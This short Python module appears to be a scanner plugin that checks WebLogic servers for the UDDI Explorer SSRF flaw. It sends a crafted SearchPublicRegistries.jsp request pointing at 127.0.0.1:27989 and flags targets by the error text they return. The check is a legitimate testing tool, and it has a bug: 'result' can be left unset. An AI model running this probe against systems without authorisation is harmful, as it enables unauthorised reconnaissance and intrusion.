import requests
from lib.random_header import get_ua
from lib.verify import get_list


def weblogic_ssrf(url):
    url = url.strip('/')
    payload = r"/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:27989"
    url = url + payload
    r = requests.get(url, allow_redirects=False, verify=False, headers=get_ua())
    if 'could not connect over HTTP to server' in r.text:
        return 'Weblogic SSRF url: {}'.format(url)


def check(ip, ports, apps):
    try:
        probe = get_list(ip, ports)
        for url in probe:
            payload = '/uddiexplorer/SearchPublicRegistries.jsp'
            r = requests.get(url + payload, timeout=3, headers=get_ua(), verify=False)
            if 'UDDI Explorer' in r.text:
                result = weblogic_ssrf(url)
    except Exception as e:
        pass
    if result:
        return result
